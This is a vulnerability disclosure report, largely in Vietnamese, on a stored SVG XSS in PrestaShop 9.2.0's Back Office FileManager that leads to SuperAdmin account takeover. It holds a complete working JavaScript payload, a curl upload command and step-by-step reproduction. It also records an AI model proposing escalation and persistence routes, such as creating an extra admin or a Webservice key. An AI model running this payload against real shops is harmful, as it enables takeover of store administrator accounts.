# Security Vulnerability Report: Administrator Account Takeover via Stored XSS (SVG File Upload in FileManager)

## 1. General Information

- Product: PrestaShop
- Tested version: 9.2.0
- Vulnerability type: Stored Cross-Site Scripting (XSS) — CWE-79
- Impact: Privilege escalation and administrator account takeover
- Entry point: Back Office FileManager SVG upload
- Final proof: SuperAdmin email/password changed and fresh login succeeded
- Reporter: Nguyễn Vương Tuấn Hiệp - nvth

---

## 2. Executive Summary

Mình phát hiện bug này đầu tiên bằng blackbox testing trên PrestaShop 9.2.0.

Lỗi ban đầu là một Stored Cross-Site Scripting trong SVG được upload qua Back Office file manager hoặc logo uploader. Một employee có quyền upload file có thể upload SVG chứa JavaScript. SVG được lưu dưới cùng origin của shop; khi employee có quyền cao hơn mở file, script chạy trong session của người đó và có thể thực hiện các thao tác quản trị.

Mình không dừng lại ở việc chứng minh JavaScript chạy trong SVG. Sau khi thấy XSS hoạt động, mình muốn biết một employee quyền thấp có thể đi xa đến đâu:

1. Dùng blackbox để upload một SVG có payload vô hại và xác nhận JavaScript thực thi.
2. Kiểm tra xem SVG được serve từ origin nào và có chạy trong session admin hay không.
3. Ban đầu nghĩ tới hướng lấy JWT hoặc session token.
4. Dùng AI như một người review thứ hai để hỏi xem XSS cùng origin còn có thể gọi những action thay đổi trạng thái nào.
5. Trace ngược vào source, tìm employee form và code xử lý password.
6. Dùng payload đã kiểm soát để đổi email/password SuperAdmin.
7. Đăng nhập lại bằng thông tin mới và xác nhận ATO.

Chain đầy đủ là:

Product Editor → Stored SVG XSS → SuperAdmin session → đổi thông tin SuperAdmin → Admin account takeover

---

## 3. Discovery: từ blackbox XSS đến ATO

### 2.1. Blackbox: mình tìm thấy XSS trước

Mình bắt đầu mà không đọc source ngay. Mình dùng một SVG rất đơn giản, chỉ có marker để biết JavaScript có chạy hay không. Sau khi upload qua Back Office file manager và mở file bằng context admin, marker xuất hiện. Như vậy mình đã có bằng chứng blackbox đầu tiên: dữ liệu SVG do employee upload được browser xử lý như một document có thể thực thi script.

Làm công nhân pentest lâu năm còn chẳng nghĩ rằng có thể kết luận ATO. Ở thời điểm này mình mới chắc chắn về XSS và nó có thể chỉ cho phép chạy JavaScript trong một trang ít quyền, nên mình kiểm tra tiếp origin của file và session đang được browser sử dụng. 

### 2.2. Hướng suy nghĩ ban đầu: lấy JWT hoặc session token

Hướng đầu tiên mình nghĩ tới là lấy JWT, cookie hoặc một token quản trị rồi dùng token đó ở bên ngoài. Đây là một hướng kiểm tra phổ biến, nhưng nó không phải con đường duy nhất.

Vì SVG được serve cùng origin với Back Office, script có thể gửi request ngay trong browser của admin. Nếu request đó đi kèm cookie/session hiện tại thì mình không nhất thiết phải lấy token ra ngoài. Mình chỉ cần khiến browser của admin thực hiện một action có tác động.

### 2.3. AI được dùng để mở rộng hypothesis

Ở bước này mình dùng AI như một second pair of eyes. Prompt của mình tập trung vào impact, không yêu cầu AI kết luận thay cho evidence:

~~~text
Tôi đã có Stored XSS trong SVG chạy cùng origin với Back Office.
Ngoài việc lấy JWT hoặc session token, hãy giúp tôi liệt kê các
state-changing action mà script có thể khiến admin browser thực hiện.
Hãy chỉ ra những route/form cần trace trong source, đặc biệt là
employee create/edit và các field liên quan đến password.
~~~

AI gợi ý mình không chỉ nhìn vào token theft mà còn kiểm tra các form có thể tạo hoặc sửa employee, các CSRF token và các POST action. Một biến thể AI gợi ý là ép admin browser submit form tạo employee mới với quyền cao, từ đó tạo một account ATO riêng. Mình không dùng biến thể đó làm bằng chứng cuối vì chưa cần thiết; mình chọn self-edit của SuperAdmin vì flow ngắn hơn và dễ verify hơn. Đây chỉ là hypothesis do AI gợi ý; bằng chứng vẫn phải do mình trace source và reproduce trong browser - hồi này mình còn chưa tin AI lắm đâu, vẫn đang "nuôi tôm" trên telegram.

### 2.4. Trace source và chọn đường chứng minh ATO

Từ hypothesis đó, mình trace lần lượt:

1. Điều kiện để Product Editor mở file manager.
2. Upload endpoint có sanitize SVG hay chỉ kiểm tra extension/MIME.
3. Route employee edit nhận GET/POST.
4. Form có chứa email và change-password hay không.
5. Form handler kiểm tra password cũ và lưu password mới như thế nào.

Mình thấy self-edit form của SuperAdmin vẫn có email và change-password. Vì vậy mình chọn cách chứng minh trực tiếp nhất: đổi email/password của chính employee ID 1, sau đó đăng nhập lại bằng browser context mới. Mình không cần tạo thêm một admin giả để chứng minh impact; việc takeover tài khoản SuperAdmin hiện tại đã đủ rõ và có thể xác minh độc lập.

---

## 4. Test Setup

Để tách rõ quyền của attacker và victim, mình dùng hai identity:

- Attacker: profile Product Editor, chỉ có quyền đọc/cập nhật sản phẩm.
- Victim: employee ID 1, profile SuperAdmin.

Mình cố tình không cấp cho Product Editor quyền employee management. Nếu mình gọi thẳng employee endpoint bằng session Product Editor, request phải bị chặn. Điểm privilege escalation xuất hiện ở chỗ browser của SuperAdmin tự thực hiện request sau khi mở SVG.

---

## 5. Technical Analysis: vì sao Product Editor upload được SVG?

### 5.1. File manager chỉ cần quyền edit Product hoặc CMS

Đầu tiên mình đọc file admin-dev/filemanager/config/config.php để xem điều kiện nào cho phép mở file manager. Code lấy quyền của employee hiện tại:

~~~php
$products_accesses = Profile::getProfileAccess(
    Context::getContext()->employee->id_profile,
    Tab::getIdFromClassName('AdminProducts')
);
$cms_accesses = Profile::getProfileAccess(
    Context::getContext()->employee->id_profile,
    Tab::getIdFromClassName('AdminCmsContent')
);

if (!$products_accesses['edit'] && !$cms_accesses['edit']) {
    throw new PrestaShopException('Access forbidden.');
}
~~~

Đoạn code thực hiện bốn việc:

1. Lấy profile của employee hiện tại.
2. Kiểm tra quyền edit của AdminProducts.
3. Kiểm tra quyền edit của AdminCmsContent.
4. Chỉ cần một quyền edit là file manager tiếp tục chạy.

Trong reproduction của mình, profile Product Editor chỉ có product read/update nhưng vẫn vào được upload flow. Như vậy mình không cần cấp quyền admin tổng thể cho attacker.

### 5.2. Upload endpoint không strip JavaScript khỏi SVG

Tiếp theo mình xem admin-dev/filemanager/upload.php. Server có kiểm tra extension và MIME:

~~~php
if (isset($info['extension'])
    && in_array(mb_strtolower($info['extension']), $ext)
    && in_array(mime_content_type($_FILES['file']['tmp_name']), $mime)
) {
    $tempFile = $_FILES['file']['tmp_name'];
    // ...
    move_uploaded_file($tempFile, $targetFile);
}
~~~

Ý nghĩa:

1. Lấy extension từ tên file.
2. Lấy MIME từ file tạm.
3. Nếu extension và MIME đều nằm trong allow-list, di chuyển file vào thư mục upload.

Đây chỉ là kiểm tra loại file, không phải kiểm tra nội dung an toàn. Code không parse SVG để loại bỏ script, event handler hoặc foreignObject. Trong reproduction của mình, file được lưu dưới img/cms và server trả về image/svg+xml:

~~~text
/img/cms/svg-admin-takeover.svg
Content-Type: image/svg+xml
~~~

Khi mình mở trực tiếp URL này, browser xử lý SVG như một document có thể chạy script.

---

## 6. Same-Origin Impact: vì sao SVG chạy bằng quyền SuperAdmin?

Sau khi upload, mình kiểm tra lại cách server phục vụ file. SVG nằm trên chính origin của shop:

~~~text
http://localhost:8001/img/cms/svg-admin-takeover.svg
~~~

Khi mình cho SuperAdmin mở file:

- location.origin vẫn là http://localhost:8001.
- Cookie/session của Back Office được gửi khi fetch dùng credentials: include.
- Script có thể gọi các route admin cùng origin.

Nói ngắn gọn, mình upload file bằng account quyền thấp, nhưng victim browser lại thực thi file bằng quyền của victim.

---

## 7. Employee Edit Path: endpoint sửa employee

Route employee edit cho phép cả GET và POST:

~~~yaml
admin_employees_edit:
  path: /{employeeId}/edit
  methods: [ GET, POST ]
~~~

Target URL mình dùng là:

~~~text
/admin-dev/configure/advanced/employees/1/edit
~~~

Controller xử lý route này sẽ kiểm tra quyền, tạo form, nhận request và gọi form handler:

~~~php
if (!$formAccessChecker->canAccessEditFormFor($employeeId)) {
    return $this->redirectToRoute('admin_employees_index');
}

$isRestrictedAccess = $formAccessChecker->isRestrictedAccess((int) $employeeId);

$employeeForm = $formBuilder->getFormFor((int) $employeeId, [], [
    'is_restricted_access' => $isRestrictedAccess,
    'is_for_editing' => true,
]);

$employeeForm->handleRequest($request);
$result = $formHandler->handleFor($employeeId, $employeeForm);
~~~

Nếu mình tự gửi request bằng session Product Editor, mình không phải SuperAdmin và không sửa được employee ID 1. Khi SVG chạy trong session SuperAdmin, request được xem là self-edit của SuperAdmin. Đây là lý do request đi qua permission check.

---

## 8. Employee Form: những field cần submit

EmployeeType thêm email và change-password form:

~~~php
->add('email', EmailType::class, [
    'label' => $this->trans('Email address', [], 'Admin.Global'),
])
->add('change_password', ChangePasswordType::class, [
    'block_prefix' => 'change_password',
])
~~~

ChangePasswordType định nghĩa password hiện tại và password mới dạng repeated field:

~~~php
->add('old_password', PasswordType::class, [
    'required' => true,
])
->add('new_password', RepeatedType::class, [
    'type' => PasswordType::class,
    'required' => true,
])
~~~

Vì Symfony dùng form lồng nhau, input name thực tế là:

~~~text
employee[email]
employee[change_password][old_password]
employee[change_password][new_password][first]
employee[change_password][new_password][second]
~~~

Trong restricted self-edit mode, một số field bị remove:

~~~php
if ($options['is_restricted_access']) {
    $builder
        ->remove('password')
        ->remove('active')
        ->remove('profile')
        ->remove('shop_association');
}
~~~

Email và change_password vẫn còn. Vì vậy không cần đổi role; chỉ cần đổi email đăng nhập và password là đủ takeover.

---

## 9. Proof of Concept Payload

Các giá trị trong dấu angle bracket là placeholder trong reproduction của mình. Khi viết report công khai, mình không đưa credential thật vào payload.

~~~xml
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="500">
<script><![CDATA[
(async function () {
  function escapeText(value) {
    return String(value == null ? '' : value).replace(/[&<>]/g, '');
  }

  function show(title, detail) {
    document.documentElement.innerHTML =
      '<foreignObject xmlns="http://www.w3.org/2000/svg" width="1000" height="500">' +
        '<body xmlns="http://www.w3.org/1999/xhtml">' +
          '<h1>' + escapeText(title) + '</h1>' +
          '<pre>' + escapeText(detail) + '</pre>' +
        '</body>' +
      '</foreignObject>';
  }

  try {
    var refUrl = document.referrer ? new URL(document.referrer) : null;

    if (!refUrl || !refUrl.searchParams.has('_token')) {
      throw new Error('missing employee-page token');
    }

    var query = '?' + refUrl.searchParams.toString();
    var editUrl =
      '/admin-dev/configure/advanced/employees/1/edit' + query;

    var editResponse = await fetch(editUrl, {
      credentials: 'include'
    });

    var editHtml = await editResponse.text();
    var parsed = new DOMParser().parseFromString(editHtml, 'text/html');

    var forms = Array.from(parsed.querySelectorAll('form'));
    var employeeForm = forms.find(function (candidate) {
      return candidate.querySelector(
        'input[name="employee[email]"]'
      );
    });

    if (!employeeForm) {
      throw new Error(
        'employee form not found; status=' +
        editResponse.status +
        '; forms=' +
        forms.length
      );
    }

    var data = new FormData(employeeForm);

    data.set('employee[email]', '<attacker-controlled-email>');
    data.set(
      'employee[change_password][old_password]',
      '<victim-current-password>'
    );
    data.set(
      'employee[change_password][new_password][first]',
      '<controlled-new-password>'
    );
    data.set(
      'employee[change_password][new_password][second]',
      '<controlled-new-password>'
    );

    var action = employeeForm.getAttribute('action') || editUrl;
    var postUrl = new URL(action, location.origin).href;

    var saveResponse = await fetch(postUrl, {
      method: 'POST',
      credentials: 'include',
      body: data
    });

    show(
      'ACCOUNT-TAKEOVER-POST-SENT',
      'status=' + saveResponse.status +
      '\nfinal-url=' + saveResponse.url
    );
  } catch (error) {
    show(
      'ACCOUNT-TAKEOVER-FAILED',
      error && error.message ? error.message : error
    );
  }
})();
]]></script>
</svg>
~~~

---

## 10. Code Walkthrough: giải thích từng đoạn code

### 10.1. IIFE async

~~~javascript
(async function () {
  // code chạy ngay khi SVG được mở
})();
~~~

IIFE tự chạy ngay. async/await giữ đúng thứ tự GET form → parse HTML → POST form.

### 10.2. Hiển thị trạng thái

escapeText chỉ giúp marker hiển thị an toàn. show thay nội dung SVG bằng foreignObject để dễ thấy thành công hoặc lỗi. Đây không phải phần tạo ra lỗ hổng; nó chỉ phục vụ debug.

### 10.3. Lấy token từ referrer

~~~javascript
var refUrl = document.referrer ? new URL(document.referrer) : null;
var query = '?' + refUrl.searchParams.toString();
~~~

Victim mở employee edit trước, nên referrer có query chứa token. Payload dùng lại query này khi GET form. Nếu thiếu token, Symfony có thể từ chối POST.

Trong lần automation của mình, công cụ đôi lúc không giữ referrer nên mình có thêm fallback token hiện tại. Với browser thực tế, mình sẽ giữ đúng flow: mở employee page trước rồi mở SVG, không hard-code token.

### 10.4. credentials include

~~~javascript
fetch(editUrl, { credentials: 'include' });
~~~

Dòng này yêu cầu browser gửi cookie/session hiện tại. Vì SVG và Back Office cùng origin, request chạy bằng session SuperAdmin của victim.

### 10.5. DOMParser

~~~javascript
var editHtml = await editResponse.text();
var parsed = new DOMParser().parseFromString(editHtml, 'text/html');
~~~

Payload không tự đoán CSRF hoặc hidden fields. Nó lấy form thật do server render rồi parse trong memory.

### 10.6. Chọn đúng form

~~~javascript
var forms = Array.from(parsed.querySelectorAll('form'));
var employeeForm = forms.find(function (candidate) {
  return candidate.querySelector(
    'input[name="employee[email]"]'
  );
});
~~~

Đây là chi tiết quan trọng nhất trong quá trình debug của mình. Trang Back Office có nhiều form, nên querySelector('form') có thể lấy nhầm header search form. Lần thử đầu của mình đúng là đã gặp lỗi này: POST trả về 200 nhưng database không đổi. Selector employee[email] giúp mình chắc chắn form được chọn là employee form thật.

### 10.7. FormData

~~~javascript
var data = new FormData(employeeForm);
~~~

Cách này giữ lại CSRF token, first name, last name, language, default page và các hidden field bắt buộc. Tạo FormData rỗng thường khiến Symfony validation từ chối request.

### 10.8. Ghi đè email/password

~~~javascript
data.set('employee[email]', '<attacker-controlled-email>');
data.set(
  'employee[change_password][new_password][first]',
  '<controlled-new-password>'
);
~~~

Các key phải khớp Symfony form tree. Password mới phải set cả first và second, nếu không RepeatedType sẽ báo mismatch.

### 10.9. POST

~~~javascript
var action = employeeForm.getAttribute('action') || editUrl;
var postUrl = new URL(action, location.origin).href;

await fetch(postUrl, {
  method: 'POST',
  credentials: 'include',
  body: data
});
~~~

POST kích hoạt code path lưu employee. Khi form hợp lệ, controller redirect 302 sau khi lưu. Vì vậy status code một mình chưa đủ để kết luận; phải kiểm tra DB và login lại.

---

## 11. Password Update: Data handler thực hiện gì?

Sau khi POST hợp lệ, mình trace tiếp vào EmployeeFormDataHandler để xem dữ liệu đi vào đâu. Handler tạo command từ dữ liệu form:

~~~php
$command = (new EditEmployeeCommand($id))
    ->setEmail($data['email']);

if ($this->employeeFormAccessChecker->isRestrictedAccess((int) $id)) {
    $this->assertPasswordIsSameAsOldPassword(
        $data['change_password']['old_password'],
        $id
    );

    $command->setPlainPassword(
        $data['change_password']['new_password'],
        $this->minLength,
        $this->maxLength,
        $this->minScore
    );
}

$this->bus->handle($command);
~~~

Password cũ phải đúng vì code gọi checkHash. Sau đó password mới được đưa vào command dưới dạng plain text để hệ thống hash theo policy trước khi lưu. Trong reproduction của mình, email đã đổi và bcrypt hash mới verify được với password do payload đặt.

---

## 12. Steps to Reproduce

### Bước 1 — Chuẩn bị account upload

Mình tạo profile Product Editor chỉ có product read/update. Mình không cấp employee management hoặc SuperAdmin.

### Bước 2 — Upload SVG

Multipart request tương đương:

~~~bash
curl -i \
  -b attacker-cookies.txt \
  -F "path=" \
  -F "path_thumb=" \
  -F "type=0" \
  -F "lang=en" \
  -F "popup=1" \
  -F "field_id=0" \
  -F "fldr=" \
  -F "submit=OK" \
  -F "file=@svg-admin-takeover.svg;type=image/svg+xml" \
  http://localhost:8001/admin-dev/filemanager/upload.php
~~~

Trong reproduction của mình, upload trả 302 và file GET được dưới img/cms.

### Bước 3 — SuperAdmin mở employee page

Mình đăng nhập bằng SuperAdmin rồi mở:

~~~text
/admin-dev/configure/advanced/employees/1/edit
~~~

Việc này tạo employee form và làm token xuất hiện trong URL/referrer, để payload có thể lấy đúng form và CSRF token.

### Bước 4 — SuperAdmin mở SVG

Sau đó mình mở:

~~~text
/img/cms/svg-admin-takeover.svg
~~~

Script chạy trong origin và session của SuperAdmin.

### Bước 5 — Payload fetch và submit

Payload của mình lấy form thật, giữ hidden fields, đổi email/password rồi POST tới employee edit endpoint.

### Bước 6 — Xác minh ATO

Kiểm tra database:

~~~sql
SELECT id_employee, email, id_profile, active,
       LENGTH(passwd) AS passwd_len
FROM ps_employee
WHERE id_employee = 1;
~~~

Sau đó mình dùng một browser context mới đăng nhập bằng email/password mới và kiểm tra rằng trang hiển thị Back Office Dashboard.

---

## 13. Evidence mình thu thập được

Các observation chính mình ghi lại được:

1. Product Editor authenticated thành công.
2. POST filemanager upload trả 302.
3. GET SVG trả 200 với image/svg+xml.
4. SuperAdmin browser GET employee form trả 200.
5. SuperAdmin browser POST employee edit trả 302.
6. Database ghi nhận email ID 1 đổi và password hash mới hoạt động.
7. Browser context mới đăng nhập và vào Dashboard.

Lần thử đầu trả 200 nhưng database không đổi vì payload chọn nhầm header form. Sau khi đổi selector sang form có input employee[email], DB mới cập nhật. Vì vậy trong report mình phân biệt rõ “request đã được gửi” với “account takeover đã được chứng minh”.

---

## 14. Impact Analysis và Remediation

Impact mình đã verify:

- Chạy JavaScript bằng session của employee quyền cao.
- Gửi request quản trị thay cho nạn nhân.
- Đổi email đăng nhập và password SuperAdmin.
- Tiếp tục sử dụng Back Office như admin.

Trong lúc đào sâu bằng AI, mình cũng xác định thêm một hướng persistence: nếu cùng session SuperAdmin có thể submit một form tạo Webservice key hoặc employee mới, attacker có thể tạo một đường truy cập tồn tại lâu hơn password hiện tại. Đây là hướng impact hợp lý để tiếp tục kiểm tra, nhưng không được mình dùng làm bằng chứng chính trong report này. Bằng chứng chính vẫn là email/password SuperAdmin đã bị đổi và fresh login thành công.

---

## 15. Kết luận của mình

Điểm mình muốn nhấn mạnh là Product Editor không có quyền sửa SuperAdmin trực tiếp. Chain thành công vì:

1. Product Editor được upload SVG.
2. SVG được phục vụ cùng origin.
3. SuperAdmin mở SVG.
4. JavaScript chạy bằng session SuperAdmin.
5. Self-edit form cho phép đổi email và password.

Đó là cách bug Stored XSS mình tìm được chuyển thành privilege escalation và cuối cùng là admin account takeover.

